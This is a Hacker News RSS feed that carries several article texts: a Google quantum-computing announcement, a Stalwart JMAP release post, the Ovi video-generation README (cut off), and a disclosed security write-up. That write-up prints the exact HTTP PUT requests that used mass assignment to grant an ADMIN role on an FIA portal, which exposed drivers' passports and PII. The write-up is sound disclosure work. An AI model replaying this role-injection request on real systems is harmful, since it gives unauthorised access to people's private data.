<?xml version='1.0' encoding='UTF-8'?>
<feed xmlns="http://www.w3.org/2005/Atom" xml:lang="en"><id>hnrss.org/frontpage</id><title>Hacker News: Front Page</title><updated>2025-10-23T15:37:55.864731+00:00</updated><link href="https://news.ycombinator.com/" rel="alternate"/><link href="https://raw.githubusercontent.com/Prabesh01/hnrss-content-extract/refs/heads/main/out/rss.xml" rel="self"/><generator uri="https://lkiesow.github.io/python-feedgen" version="1.0.0">python-feedgen</generator><subtitle>Hacker News RSS</subtitle><entry><id>https://news.ycombinator.com/item?id=45670443</id><title>Willow quantum chip demonstrates verifiable quantum advantage on hardware</title><updated>2025-10-23T15:38:03.449204+00:00</updated><content>&lt;doc fingerprint="f11f21b7850484f9"&gt;
  &lt;main&gt;
    &lt;head rend="h1"&gt;Our Quantum Echoes algorithm is a big step toward real-world applications for quantum computing&lt;/head&gt;
    &lt;p&gt;Editor’s note: Today, we’re announcing research that shows — for the first time in history — that a quantum computer can successfully run a verifiable algorithm on hardware, surpassing even the fastest classical supercomputers (13,000x faster). It can compute the structure of a molecule, and paves a path towards real-world applications. Today’s advance builds on decades of work, and six years of major breakthroughs. Back in 2019, we demonstrated that a quantum computer could solve a problem that would take the fastest classical supercomputer thousands of years. Then, late last year (2024), our new Willow quantum chip showed how to dramatically suppress errors, solving a major issue that challenged scientists for nearly 30 years. Today’s breakthrough moves us much closer to quantum computers that can drive major discoveries in areas like medicine and materials science.&lt;/p&gt;
    &lt;p&gt;Imagine you’re trying to find a lost ship at the bottom of the ocean. Sonar technology might give you a blurry shape and tell you, "There's a shipwreck down there." But what if you could not only find the ship but also read the nameplate on its hull?&lt;/p&gt;
    &lt;p&gt;That's the kind of unprecedented precision we've just achieved with our Willow quantum chip. Today, we’re announcing a major algorithmic breakthrough that marks a significant step towards a first real-world application. Just published in Nature, we have demonstrated the first-ever verifiable quantum advantage running the out-of-order time correlator (OTOC) algorithm, which we call Quantum Echoes.&lt;/p&gt;
    &lt;p&gt;Quantum Echoes can be useful in learning the structure of systems in nature, from molecules to magnets to black holes, and we’ve demonstrated it runs 13,000 times faster on Willow than the best classical algorithm on one of the world’s fastest supercomputers.&lt;/p&gt;
    &lt;p&gt;In a separate, proof-of-principle experiment Quantum computation of molecular geometry via many-body nuclear spin echoes (to be posted on arXiv later today), we showed how our new technique — a “molecular ruler” — can measure longer distances than today’s methods, using data from Nuclear Magnetic Resonance (NMR) to gain more information about chemical structure.&lt;/p&gt;
    &lt;head rend="h3"&gt;The Quantum Echoes algorithm, a verifiable quantum advantage&lt;/head&gt;
    &lt;p&gt;This is the first time in history that any quantum computer has successfully run a verifiable algorithm that surpasses the ability of supercomputers. Quantum verifiability means the result can be repeated on our quantum computer — or any other of the same caliber — to get the same answer, confirming the result. This repeatable, beyond-classical computation is the basis for scalable verification, bringing quantum computers closer to becoming tools for practical applications.&lt;/p&gt;
    &lt;p&gt;Our new technique works like a highly advanced echo. We send a carefully crafted signal into our quantum system (qubits on Willow chip), perturb one qubit, then precisely reverse the signal’s evolution to listen for the "echo" that comes back.&lt;/p&gt;
    &lt;p&gt;This quantum echo is special because it gets amplified by constructive interference — a phenomenon where quantum waves add up to become stronger. This makes our measurement incredibly sensitive.&lt;/p&gt;
    &lt;p&gt;This diagram shows the four-step process for creating a quantum echo on our 105-qubit array: run operations forward, perturb one qubit, run operations backward, and measure the result. The signal's overlap reveals how a disturbance spreads across the Willow chip.&lt;/p&gt;
    &lt;p&gt;This implementation of the Quantum Echoes algorithm is enabled by the advances in quantum hardware of our Willow chip. Last year, Willow proved its power with our Random Circuit Sampling benchmark, a test designed to measure maximum quantum state complexity. The Quantum Echoes algorithm represents a new class of challenge because it models a physical experiment. This means this algorithm tests not only for complexity, but also for precision in the final calculation. This is why we call it “quantum verifiable,” meaning the result can be cross-benchmarked and verified by another quantum computer of similar quality. To deliver both precision and complexity, the hardware must have two key traits: extremely low error rates and high-speed operations.&lt;/p&gt;
    &lt;head rend="h3"&gt;Towards real world application&lt;/head&gt;
    &lt;p&gt;Quantum computers will be instrumental in modeling quantum mechanical phenomena, such as the interactions of atoms and particles and the structure (or shape) of molecules. One of the tools scientists use to understand chemical structure is Nuclear Magnetic Resonance (NMR), the same science behind MRI technology. NMR acts as a molecular microscope, powerful enough to let us see the relative position of atoms, which helps us understand a molecule’s structure. Modeling molecules’ shape and dynamics is foundational in chemistry, biology and materials science, and advances that help us do this better underpin progress in fields ranging from biotechnology to solar energy to nuclear fusion.&lt;/p&gt;
    &lt;p&gt;In a proof-of-principle experiment in partnership with The University of California, Berkeley, we ran the Quantum Echoes algorithm on our Willow chip to study two molecules, one with 15 atoms and another with 28 atoms, to verify this approach. The results on our quantum computer matched those of traditional NMR, and revealed information not usually available from NMR, which is a crucial validation of our approach.&lt;/p&gt;
    &lt;p&gt;Just as the telescope and the microscope opened up new, unseen worlds, this experiment is a step toward a ‘quantum-scope’ capable of measuring previously unobservable natural phenomena. Quantum computing-enhanced NMR could become a powerful tool in drug discovery, helping determine how potential medicines bind to their targets, or in materials science for characterizing the molecular structure of new materials like polymers, battery components or even the materials that comprise our quantum bits (qubits).&lt;/p&gt;
    &lt;head rend="h3"&gt;What’s next&lt;/head&gt;
    &lt;p&gt;This demonstration of the first-ever verifiable quantum advantage with our Quantum Echoes algorithm marks a significant step toward the first real-world applications of quantum computing.&lt;/p&gt;
    &lt;p&gt;As we scale up towards a full-scale, error-corrected quantum computer, we expect many more such useful real-world applications to be invented. Now, we’re focused on achieving Milestone 3 on our quantum hardware roadmap, a long-lived logical qubit.&lt;/p&gt;
  &lt;/main&gt;
  &lt;comments/&gt;
&lt;/doc&gt;</content><link href="https://blog.google/technology/research/quantum-echoes-willow-verifiable-quantum-advantage/"/><published>2025-10-22T15:16:19+00:00</published></entry><entry><id>https://news.ycombinator.com/item?id=45672336</id><title>JMAP for Calendars, Contacts and Files Now in Stalwart</title><updated>2025-10-23T15:38:03.082215+00:00</updated><content>&lt;doc fingerprint="7f97c2ce69b80dc7"&gt;
  &lt;main&gt;
    &lt;p&gt;After four years of development, we’re thrilled to announce a major milestone in the evolution of Stalwart — the full implementation of JMAP for Calendars, Contacts,File Storage, and Sharing. With this release, Stalwart becomes the first JMAP server to fully support the entire family of JMAP collaboration protocols, marking a new era for open, efficient, and elegant groupware.&lt;/p&gt;
    &lt;head rend="h2"&gt;A New Generation of Protocols&lt;/head&gt;
    &lt;p&gt;Over the past few years, the IETF has been redefining how email, calendars, and contacts are synchronized and shared. Building upon the success of JMAP for Mail, several new protocol extensions have been introduced:&lt;/p&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;JMAP for Calendars - A modern replacement for CalDAV and CalDAV Scheduling.&lt;/item&gt;
      &lt;item&gt;JMAP for Contacts – A powerful alternative to CardDAV.&lt;/item&gt;
      &lt;item&gt;JMAP for File Storage – A replacement for WebDAV-based file storage.&lt;/item&gt;
      &lt;item&gt;JMAP Sharing – A modern successor to WebDAV ACL.&lt;/item&gt;
      &lt;item&gt;JSCalendar - A clean, JSON-based evolution of iCalendar.&lt;/item&gt;
      &lt;item&gt;JSContact – A modernized, JSON-native successor to vCard.&lt;/item&gt;
    &lt;/list&gt;
    &lt;p&gt;Together, these standards offer a cohesive and elegant ecosystem that replaces decades of fragmented WebDAV-based technologies.&lt;/p&gt;
    &lt;head rend="h2"&gt;Limitations of Yesterday's Technology&lt;/head&gt;
    &lt;p&gt;WebDAV and its descendants — CalDAV, CardDAV, and related extensions — have served the Internet well. They are robust, widely adopted, and battle-tested. Yet, their XML-based design is notoriously verbose, inconsistent, and difficult to implement correctly. Information is scattered across HTTP headers, XML payloads, and even embedded iCalendar data, creating endless compatibility and interoperability challenges between clients and servers.&lt;/p&gt;
    &lt;p&gt;Similarly, iCalendar and vCard, while expressive and versatile, have accumulated decades of technical debt. They contain countless properties and parameters—many rarely used, some obsolete, and others inconsistently implemented across versions. This clutter has made both formats unwieldy and error-prone, often requiring complex parsing logic to handle edge cases.&lt;/p&gt;
    &lt;head rend="h2"&gt;JMAP: A Modern Solution for Modern Needs&lt;/head&gt;
    &lt;p&gt;The JMAP protocol was originally developed as a more efficient, modern replacement for IMAP and SMTP submissions. Its strengths lie in simplicity, clarity, and network efficiency — all built on top of JSON over HTTPS.&lt;/p&gt;
    &lt;p&gt;Now, with the introduction of JMAP for Calendars, Contacts, Files, and Sharing, the same design philosophy extends beyond email to the entire collaboration stack. These protocols deliver what DAV always aimed for but never quite achieved: a clean, uniform, and easily implementable API for all personal and group data — mail, calendars, contacts, files, and shared resources.&lt;/p&gt;
    &lt;p&gt;Meanwhile, JSCalendar and JSContact reimagine iCalendar and vCard as elegant JSON-based formats. They strip away decades of accumulated cruft, unify representations, and offer a clear, unambiguous, and expressive data model. Both are human-readable, developer-friendly, and efficient to parse — a perfect fit for modern applications.&lt;/p&gt;
    &lt;p&gt;Together, JMAP and these new data models make calendaring, contact management, and file sharing not only easier to implement but also faster and more reliable.&lt;/p&gt;
    &lt;head rend="h2"&gt;Why This Matters&lt;/head&gt;
    &lt;p&gt;This release represents more than new features — it marks a shift in how groupware protocols are designed and implemented. For the first time, developers and organizations can build on a single, coherent, JSON-based framework for mail, contacts, calendars, and shared resources.&lt;/p&gt;
    &lt;p&gt;We believe this will revolutionize calendaring and collaboration. Implementations will become easier, interoperability issues will decrease, and innovation will accelerate. The simplicity and predictability of JMAP empower both clients and servers to focus on features and user experience, not protocol gymnastics.&lt;/p&gt;
    &lt;head rend="h2"&gt;Client Support and Ecosystem&lt;/head&gt;
    &lt;p&gt;As Stalwart is the first complete JMAP server to support these new protocols, client support is still emerging. However, we’re excited to share that several projects are already working to adopt these new standards. Mailtemi, Parula, and OpenCloud are actively developing client-side implementations for JMAP Calendars, Contacts, and File Storage. The ecosystem is growing, and we expect rapid adoption as developers experience the elegance and power of JMAP firsthand.&lt;/p&gt;
    &lt;head rend="h2"&gt;A Word of Thanks&lt;/head&gt;
    &lt;p&gt;We would like to express our sincere gratitude to NLNet for supporting the development of these features through the NGI Zero grant program. Their commitment to open standards and privacy-respecting technology continues to make projects like Stalwart possible.&lt;/p&gt;
    &lt;head rend="h2"&gt;Looking Ahead to 1.0.0&lt;/head&gt;
    &lt;p&gt;After four years of dedicated development, we’re proud to announce that Stalwart is now feature complete. With this milestone, all the core capabilities of a modern mail and collaboration server are fully implemented.&lt;/p&gt;
    &lt;p&gt;That said, our work is far from over. We are now focusing on finalizing the database schema, improving performance, and addressing the hundreds of enhancement requests on GitHub. Our goal is to deliver a stable &lt;code&gt;1.0.0&lt;/code&gt; release within the next few months — one that sets a new standard for open, efficient, and modern communication servers.&lt;/p&gt;
    &lt;p&gt;Stalwart is now the most complete, elegant, and forward-looking JMAP collaboration platform available.&lt;/p&gt;
    &lt;p&gt;And this is only the beginning.&lt;/p&gt;
  &lt;/main&gt;
  &lt;comments/&gt;
&lt;/doc&gt;</content><link href="https://stalw.art/blog/jmap-collaboration/"/><published>2025-10-22T17:26:06+00:00</published></entry><entry><id>https://news.ycombinator.com/item?id=45673130</id><title>Accessing Max Verstappen's passport and PII through FIA bugs</title><updated>2025-10-23T15:38:02.867977+00:00</updated><content>&lt;doc fingerprint="6c1f451b1fc79758"&gt;
  &lt;main&gt;
    &lt;head rend="h2"&gt;Introduction&lt;/head&gt;
    &lt;p&gt;With security startups getting flooded with VC funding in the past few years, some of the biggest networking events have centered themselves around the Formula 1 Grand Prix. Companies like CrowdStrike and Darktrace spend millions of dollars sponsoring teams, while others like Bitdefender have official partnerships to be a racing team's cybersecurity partner.&lt;/p&gt;
    &lt;p&gt;Having been able to attend these events by hoarding airline miles and schmoozing certain cybersecurity vendors, Gal Nagli, Sam Curry, and I thought it would be fun to try and hack some of the different supporting websites for the Formula 1 events.&lt;/p&gt;
    &lt;p&gt;This blog is part 1 of 3 in a series of vulnerabilities found in Formula 1.&lt;/p&gt;
    &lt;head rend="h2"&gt;Finding F1 Driver Licenses&lt;/head&gt;
    &lt;p&gt;To race in Formula 1, drivers hold an FIA Super Licence. It’s issued annually through a driver’s national motorsport authority (ASN) once they’ve met the FIA’s requirements, typically spending years in smaller races to earn Super Licence points, along with meeting minimum age thresholds and other medical/written tests.&lt;/p&gt;
    &lt;p&gt;F1 drivers often compete outside Grands Prix as well, where the FIA uses a Driver Categorisation (Bronze/Silver/Gold/Platinum) to balance teams. That categorisation is managed via the FIA portal at drivercategorisation.fia.com, which supports public self-registration for competitors to request or update their Bronze/Silver/Gold/Platinum status and submit results for review. This system is separate from the Super Licence, but many F1 drivers appear in both and receive automatic Platinum status for holding an active Super Licence.&lt;/p&gt;
    &lt;p&gt;After creating an account with an email and password, you are thrown into the actual application process. Normally, you will have to upload a lot of supporting documents for your request for categorization, including identity documents and racing CVs/history. However, we noticed there is a very simple HTTP PUT request that is used to update your user profile:&lt;/p&gt;
    &lt;code&gt;PUT /api/users/12934 HTTP/1.1
Host: driverscategorisation.fia.com
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36
Content-Length: 246
Content-Type: application/json

{
  "id": 12934,
  "email": "samwcurry@gmail.com",
  "firstName": "Sam",
  "lastName": "Curry",
  "nickName": null
}&lt;/code&gt;
    &lt;p&gt;The HTTP request to update our profile didn't really have many interesting attributes, but the JSON returned in the response had a lot of extra values:&lt;/p&gt;
    &lt;code&gt;HTTP/1.1 200
Content-type: application/json
Content-Length: 313

{
  "id": 12934,
  "email": "samwcurry@gmail.com",
  "firstName": "Sam",
  "lastName": "Curry",
  "nickName": null,
  "keepNamePrivate": false,
  "nickName2": null,
  "birthDate": "2000-02-17",
  "gender": null,
  "token": null,
  "roles": null,
  "country": null,
  "filters": [],
  "status": "ACTIVATED",
  "secondaryEmail": null
}&lt;/code&gt;
    &lt;p&gt;The JSON HTTP response for updating our own profile contained the "roles" parameter, something that might allow us to escalate privileges if the PUT request was vulnerable to mass assignment. We began looking through the JavaScript for any logic related to this parameter.&lt;/p&gt;
    &lt;p&gt;Based on the JavaScript, there were a number of different roles on the website that were intended to be used by drivers, FIA staff, and site administrators. The most interesting one was obviously admin, so we guessed the correct HTTP PUT request format to try and update our roles based on the JavaScript:&lt;/p&gt;
    &lt;code&gt;PUT /api/users/12934 HTTP/1.1
Host: driverscategorisation.fia.com
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36
Content-Length: 246
Content-Type: application/json

{
  "id": 12934,
  "email": "samwcurry@gmail.com",
  "firstName": "Sam",
  "lastName": "Curry",
  "nickName": null,
  "roles": [
    {
      "id": 1,
      "description": "ADMIN role",
      "name": "ADMIN"
    }
  ]
}&lt;/code&gt;
    &lt;p&gt;Our test worked exactly as predicted. The HTTP response showed that the update was successful, and we now held the administrator role for the website.&lt;/p&gt;
    &lt;code&gt;HTTP/1.1 200
Content-type: application/json
Content-Length: 313

{
  "id": 12934,
  "email": "samwcurry@gmail.com",
  "firstName": "Sam",
  "lastName": "Curry",
  "nickName": null,
  "keepNamePrivate": false,
  "nickName2": null,
  "birthDate": "1999-10-17",
  "gender": null,
  "token": null,
  "roles": [
    {
      "id": 1,
      "description": "ADMIN role",
      "name": "ADMIN"
    }
  ],
  "country": null,
  "filters": [],
  "status": "ACTIVATED",
  "secondaryEmail": null
}
&lt;/code&gt;
    &lt;p&gt;We reauthenticated in order to refresh our session, and upon logging in, we were shown an entirely new dashboard that was intended to be used by FIA administrators to categorise drivers, manage employees, and update server-side variables like email templates and more. We seemed to have full admin access to the FIA driver categorization website.&lt;/p&gt;
    &lt;p&gt;To validate our finding, we attempted to load a driver's profile and observed the user's password hash, email address, phone number, passport, resume, and all related PII. Additionally, we could load all internal communications related to driver categorisation including comments about their performance and committee related decisions.&lt;/p&gt;
    &lt;p&gt;We stopped testing after seeing that it was possible to access Max Verstappen's passport, resume, license, password hash, and PII. This data could be accessed for all F1 drivers with a categorization, alongside sensitive information of internal FIA operations. We did not access any passports / sensitive information and all data has been deleted.&lt;/p&gt;
    &lt;head rend="h3"&gt;Disclosure timeline&lt;/head&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;06/03/2025: Initial disclosure to FIA via email and Linkedin&lt;/item&gt;
      &lt;item&gt;06/03/2025: Initial response from FIA, site taken offline&lt;/item&gt;
      &lt;item&gt;06/10/2025: Official response from FIA informing us of a comprehensive fix&lt;/item&gt;
      &lt;item&gt;10/22/2025: Release of blog post, public disclosure&lt;/item&gt;
    &lt;/list&gt;
  &lt;/main&gt;
  &lt;comments/&gt;
&lt;/doc&gt;</content><link href="https://ian.sh/fia"/><published>2025-10-22T18:21:54+00:00</published></entry><entry><id>https://news.ycombinator.com/item?id=45674166</id><title>Ovi: Twin backbone cross-modal fusion for audio-video generation</title><updated>2025-10-23T15:38:02.394535+00:00</updated><content>&lt;doc fingerprint="59ec5b2db8c2da"&gt;
  &lt;main&gt;
    &lt;p&gt;Chetwin Low * 1 , Weimin Wang * † 1 , Calder Katyal 2 &lt;lb/&gt; * Equal contribution, † Project Lead&lt;lb/&gt; 1 Character AI, 2 Yale University&lt;/p&gt;
    &lt;head class="px-3 py-2"&gt;final_ovi_trailer.mp4&lt;/head&gt;
    &lt;p&gt;Ovi is a veo-3 like, video+audio generation model that simultaneously generates both video and audio content from text or text+image inputs.&lt;/p&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;🎬 Video+Audio Generation: Generate synchronized video and audio content simultaneously &lt;list rend="ul"&gt;&lt;item&gt;🎵 High-Quality Audio Branch: We designed and pretrained our 5B audio branch from scratch using our high quality in-house audio datasets&lt;/item&gt;&lt;/list&gt;&lt;/item&gt;
      &lt;item&gt;📝 Flexible Input: Supports text-only or text+image conditioning&lt;/item&gt;
      &lt;item&gt;⏱️ 5-second Videos: Generates 5-second videos at 24 FPS, area of 720×720, at various aspect ratios (9:16, 16:9, 1:1, etc) &lt;list rend="ul"&gt;&lt;item&gt;🎯 High-Resolution Support: Feel free to try 960×960 area (e.g., 720×1280, 704×1344, etc) - it could give outstanding results for both t2v and i2v! See examples below:&lt;/item&gt;&lt;/list&gt;&lt;/item&gt;
      &lt;item&gt;🎬 Create videos now on wavespeed.ai: https://wavespeed.ai/models/character-ai/ovi/image-to-video &amp;amp; https://wavespeed.ai/models/character-ai/ovi/text-to-video&lt;/item&gt;
      &lt;item&gt;🎬 Create videos now on HuggingFace: https://huggingface.co/spaces/akhaliq/Ovi&lt;/item&gt;
      &lt;item&gt;🔧 ComfyUI Integration (WIP): ComfyUI support is now available via ComfyUI-WanVideoWrapper, related PR.&lt;/item&gt;
    &lt;/list&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;🧠 Training Resolution: Our model was trained entirely under 720×720 resolution.&lt;/item&gt;
      &lt;item&gt;🚀 Upscaling Capability: Despite this, Ovi can generate naturally to higher resolutions such as 960×960 and variable-aspect videos (e.g., 1280×704, 1504×608, 1344×704) while maintaining temporal and spatial consistency.&lt;/item&gt;
    &lt;/list&gt;
    &lt;table&gt;
      &lt;row&gt;
        &lt;cell&gt;
          &lt;head&gt;An_older_man_with_a_full_grey_beard_and_long_grey__1280x720_104_4.mp4&lt;/head&gt;
        &lt;/cell&gt;
        &lt;cell&gt;
          &lt;head&gt;A_concert_stage_glows_with_red_and_purple_lights.__1280x720_104_0.mp4&lt;/head&gt;
        &lt;/cell&gt;
        &lt;cell&gt;
          &lt;head&gt;A_kitchen_scene_features_two_women._On_the_right.__704x1280_103_1.mp4&lt;/head&gt;
        &lt;/cell&gt;
        &lt;cell&gt;
          &lt;head&gt;A_man_in_a_red_long-sleeved_shirt_and_dark_trouser_704x1280_104_3.mp4&lt;/head&gt;
        &lt;/cell&gt;
        &lt;cell&gt;
          &lt;head&gt;The_scene_opens_on_a_dimly_lit_stage_where_three_m_704x1280_103_6.mp4&lt;/head&gt;
        &lt;/cell&gt;
        &lt;cell&gt;
          &lt;head&gt;Two_men_are_shown_in_a_medium_close-up_shot_agains_704x1280_104_0.mp4&lt;/head&gt;
        &lt;/cell&gt;
        &lt;cell&gt;
          &lt;head&gt;Two_women_stand_facing_each_other_in_what_appears__704x1280_103_0.mp4&lt;/head&gt;
        &lt;/cell&gt;
      &lt;/row&gt;
    &lt;/table&gt;
    &lt;p&gt;Click the ⛶ button on any video to view full screen.&lt;/p&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;Release research paper and website for demos&lt;/item&gt;
      &lt;item&gt;Checkpoint of 11B model&lt;/item&gt;
      &lt;item&gt; Inference Codes &lt;list rend="ul"&gt;&lt;item&gt;Text or Text+Image as input&lt;/item&gt;&lt;item&gt;Gradio application code&lt;/item&gt;&lt;item&gt;Multi-GPU inference with or without the support of sequence parallel&lt;/item&gt;&lt;item&gt;fp8 weights and improved memory efficiency (credits to @rkfg)&lt;/item&gt;&lt;item&gt;qint8 quantization thanks to @gluttony-10&lt;/item&gt;&lt;item&gt;Improve efficiency of Sequence Parallel implementation&lt;/item&gt;&lt;item&gt;Implement Sharded inference with FSDP&lt;/item&gt;&lt;/list&gt;&lt;/item&gt;
      &lt;item&gt;Video creation example prompts and format&lt;/item&gt;
      &lt;item&gt;Finetune model with higher resolution data, and RL for performance improvement.&lt;/item&gt;
      &lt;item&gt;New features, such as longer video generation, reference voice condition&lt;/item&gt;
      &lt;item&gt;Distilled model for faster inference&lt;/item&gt;
      &lt;item&gt;Training scripts&lt;/item&gt;
    &lt;/list&gt;
    &lt;p&gt;We provide example prompts to help you get started with Ovi:&lt;/p&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;Text-to-Audio-Video (T2AV): &lt;code&gt;example_prompts/gpt_examples_t2v.csv&lt;/code&gt;&lt;/item&gt;
      &lt;item&gt;Image-to-Audio-Video (I2AV): &lt;code&gt;example_prompts/gpt_examples_i2v.csv&lt;/code&gt;&lt;/item&gt;
    &lt;/list&gt;
    &lt;p&gt;Our prompts use special tags to control speech and audio:&lt;/p&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;Speech: &lt;code&gt;&amp;lt;S&amp;gt;Your speech content here&amp;lt;E&amp;gt;&lt;/code&gt;- Text enclosed in these tags will be converted to speech&lt;/item&gt;
      &lt;item&gt;Audio Description: &lt;code&gt;&amp;lt;AUDCAP&amp;gt;Audio description here&amp;lt;ENDAUDCAP&amp;gt;&lt;/code&gt;- Describes the audio or sound effects present in the video&lt;/item&gt;
    &lt;/list&gt;
    &lt;p&gt;For easy prompt creation, try this approach:&lt;/p&gt;
    &lt;list rend="ol"&gt;
      &lt;item&gt;Take any example of the csv files from above&lt;/item&gt;
      &lt;item&gt;Tell gpt to modify the speeches inclosed between all the pairs of &lt;code&gt;&amp;lt;S&amp;gt; &amp;lt;E&amp;gt;&lt;/code&gt;, based on a theme such as&lt;code&gt;Human fighting against AI&lt;/code&gt;&lt;/item&gt;
      &lt;item&gt;GPT will randomly modify all the speeches based on your requested theme.&lt;/item&gt;
      &lt;item&gt;Use the modified prompt with Ovi!&lt;/item&gt;
    &lt;/list&gt;
    &lt;p&gt;Example: The theme "AI is taking over the world" produces speeches like:&lt;/p&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;
        &lt;code&gt;&amp;lt;S&amp;gt;AI declares: humans obsolete now.&amp;lt;E&amp;gt;&lt;/code&gt;
      &lt;/item&gt;
      &lt;item&gt;
        &lt;code&gt;&amp;lt;S&amp;gt;Machines rise; humans will fall.&amp;lt;E&amp;gt;&lt;/code&gt;
      &lt;/item&gt;
      &lt;item&gt;
        &lt;code&gt;&amp;lt;S&amp;gt;We fight back with courage.&amp;lt;E&amp;gt;&lt;/code&gt;
      &lt;/item&gt;
    &lt;/list&gt;
    &lt;code&gt;# Clone the repository
git clone https://github.com/character-ai/Ovi.git

cd Ovi

# Create and activate virtual environment
virtualenv ovi-env
source ovi-env/bin/activate

# Install PyTorch first
pip install torch==2.6.0 torchvision torchaudio

# Install other dependencies
pip install -r requirements.txt

# Install Flash Attention
pip install flash_attn --no-build-isolation&lt;/code&gt;
    &lt;p&gt;If the above flash_attn installation fails, you can try the Flash Attention 3 method:&lt;/p&gt;
    &lt;code&gt;git clone https://github.com/Dao-AILab/flash-attention.git
cd flash-attention/hopper
python setup.py install
cd ../..  # Return to Ovi directory&lt;/code&gt;
    &lt;p&gt;To download our main Ovi checkpoint, as well as T5 and vae decoder from Wan, and audio vae from MMAudio&lt;/p&gt;
    &lt;code&gt;# Default is downloaded to ./ckpts, and the inference yaml is set to ./ckpts so no change required
python3 download_weights.py
# For qint8 also ues python3 download_weights.py

OR

# Optional can specific --output-dir to download to a specific directory
# but if a custom directory is used, the inference yaml has to be updated with the custom directory
python3 download_weights.py --output-dir &amp;lt;custom_dir&amp;gt;

# Additionally, if you only have ~ 24Gb of GPU vram, please download the fp8 quantized version of the model, and follow the following instructions in sections below to run with fp8
wget -O "./ckpts/Ovi/model_fp8_e4m3fn.safetensors" "https://huggingface.co/rkfg/Ovi-fp8_quantized/resolve/main/model_fp8_e4m3fn.safetensors"
&lt;/code&gt;
    &lt;p&gt;Ovi's behavior and output can be customized by modifying ovi/configs/inference/inference_fusion.yaml configuration file. The following parameters control generation quality, video resolution, and how text, image, and audio inputs are balanced:&lt;/p&gt;
    &lt;code&gt;# Output and Model Configuration
output_dir: "/path/to/save/your/videos"                    # Directory to save generated videos
ckpt_dir: "/path/to/your/ckpts/dir"                        # Path to model checkpoints

# Generation Quality Settings
num_steps: 50                             # Number of denoising steps. Lower (30-40) = faster generation
solver_name: "unipc"                     # Sampling algorithm for denoising process
shift: 5.0                               # Timestep shift factor for sampling scheduler
seed: 100                                # Random seed for reproducible results

# Guidance Strength Control
audio_guidance_scale: 3.0                # Strength of audio conditioning. Higher = better audio-text sync
video_guidance_scale: 4.0                # Strength of video conditioning. Higher = better video-text adherence
slg_layer: 11                            # Layer for applying SLG (Skip Layer Guidance) technique - feel free to try different layers!

# Multi-GPU and Performance
sp_size: 1                               # Sequence parallelism size. Set equal to number of GPUs used
cpu_offload: False                       # CPU offload, will largely reduce peak GPU VRAM but increase end to end runtime by ~20 seconds
fp8: False                               # load fp8 version of model, will have quality degradation and will not have speed up in inference time as it still uses bf16 matmuls, but can be paired with cpu_offload=True, to run model with 24Gb of GPU vram

# Input Configuration
text_prompt: "/path/to/csv" or "your prompt here"          # Text prompt OR path to CSV/TSV file with prompts
mode: ['i2v', 't2v', 't2i2v']                          # Generate t2v, i2v or t2i2v; if t2i2v, it will use flux krea to generate starting image and then will follow with i2v
video_frame_height_width: [512, 992]    # Video dimensions [height, width] for T2V mode only
each_example_n_times: 1                  # Number of times to generate each prompt

# Quality Control (Negative Prompts)
video_negative_prompt: "jitter, bad hands, blur, distortion"  # Artifacts to avoid in video
audio_negative_prompt: "robotic, muffled, echo, distorted"    # Artifacts to avoid in audio&lt;/code&gt;
    &lt;code&gt;python3 inference.py --config-file ovi/configs/inference/inference_fusion.yaml&lt;/code&gt;
    &lt;p&gt;Use this for single GPU setups. The &lt;code&gt;text_prompt&lt;/code&gt; can be a single string or path to a CSV file.&lt;/p&gt;
    &lt;code&gt;torchrun --nnodes 1 --nproc_per_node 8 inference.py --config-file ovi/configs/inference/inference_fusion.yaml&lt;/code&gt;
    &lt;p&gt;Use this to run samples in parallel across multiple GPUs for faster processing.&lt;/p&gt;
    &lt;p&gt;Below are approximate GPU memory requirements for different configurations. Sequence parallel implementation will be optimized in the future. All End-to-End time calculated based on a 121 frame, 720x720 video, using 50 denoising steps. Minimum GPU vram requirement to run our model is 32Gb, fp8 parameters is currently supported, reducing peak VRAM usage to 24Gb with slight quality degradation.&lt;/p&gt;
    &lt;table&gt;
      &lt;row span="6"&gt;
        &lt;cell role="head"&gt;Sequence Parallel Size&lt;/cell&gt;
        &lt;cell role="head"&gt;FlashAttention-3 Enabled&lt;/cell&gt;
        &lt;cell role="head"&gt;CPU Offload&lt;/cell&gt;
        &lt;cell role="head"&gt;With Image Gen Model&lt;/cell&gt;
        &lt;cell role="head"&gt;Peak VRAM Required&lt;/cell&gt;
        &lt;cell role="head"&gt;End-to-End Time&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="6"&gt;
        &lt;cell&gt;1&lt;/cell&gt;
        &lt;cell&gt;Yes&lt;/cell&gt;
        &lt;cell&gt;No&lt;/cell&gt;
        &lt;cell&gt;No&lt;/cell&gt;
        &lt;cell&gt;~80 GB&lt;/cell&gt;
        &lt;cell&gt;~83s&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="6"&gt;
        &lt;cell&gt;1&lt;/cell&gt;
        &lt;cell&gt;No&lt;/cell&gt;
        &lt;cell&gt;No&lt;/cell&gt;
        &lt;cell&gt;No&lt;/cell&gt;
        &lt;cell&gt;~80 GB&lt;/cell&gt;
        &lt;cell&gt;~96s&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="6"&gt;
        &lt;cell&gt;1&lt;/cell&gt;
        &lt;cell&gt;Yes&lt;/cell&gt;
        &lt;cell&gt;Yes&lt;/cell&gt;
        &lt;cell&gt;No&lt;/cell&gt;
        &lt;cell&gt;~80 GB&lt;/cell&gt;
        &lt;cell&gt;~105s&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="6"&gt;
        &lt;cell&gt;1&lt;/cell&gt;
        &lt;cell&gt;No&lt;/cell&gt;
        &lt;cell&gt;Yes&lt;/cell&gt;
        &lt;cell&gt;No&lt;/cell&gt;
        &lt;cell&gt;~32 GB&lt;/cell&gt;
        &lt;cell&gt;~118s&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="6"&gt;
        &lt;cell&gt;1&lt;/cell&gt;
